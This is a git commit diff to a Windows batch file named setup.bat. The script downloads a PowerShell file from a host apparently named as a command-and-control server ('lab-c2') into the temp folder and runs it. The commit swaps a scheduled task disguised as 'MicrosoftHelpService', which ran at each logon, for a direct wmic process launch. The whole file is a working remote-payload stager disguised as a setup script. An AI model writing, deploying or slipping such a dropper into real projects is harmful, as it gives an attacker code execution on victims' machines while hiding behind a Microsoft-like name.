745000a39d194bc49842916d4fb8de8ed5143fe9
felixnth <felixnoethgen1@gmail.com>
2026-07-25 03:54:27 +0000

    use wmic instead of schtasks

--- setup.bat
+++ setup.bat
@@ -1,6 +1,5 @@
 @echo off
 set PS1=%TEMP%\winhelper.ps1
 powershell -Command "Invoke-WebRequest -Uri 'https://lab-c2.onrender.com/download' -OutFile '%PS1%' -UseBasicParsing"
-schtasks /create /tn "MicrosoftHelpService" /tr "powershell -NonInteractive -File \"%PS1%\"" /sc onlogon /ru %USERNAME% /f >nul 2>&1
-schtasks /run /tn "MicrosoftHelpService" >nul 2>&1
+wmic process call create "powershell -NonInteractive -File \"%PS1%\""
 exit
